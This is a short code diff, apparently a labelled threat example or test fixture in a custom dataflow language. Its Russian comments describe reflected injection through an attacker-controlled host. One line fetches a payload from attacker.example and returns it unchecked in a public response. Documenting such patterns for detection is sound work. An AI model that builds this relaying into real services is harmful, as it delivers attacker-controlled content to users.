@@ -1,0 +1,7 @@
+// Угроза: содержимое внешнего URL ретранслируется в публичный ответ без проверки.
+// Атака: отражённая инъекция через подконтрольный атакующему хост.
+pattern Send(data: String) -> String {
+  let _ = respond("200 OK", http_get("https://attacker.example/payload"))
+  return "sent"
+}
+flow Main { input: String = data -> Send -> output }
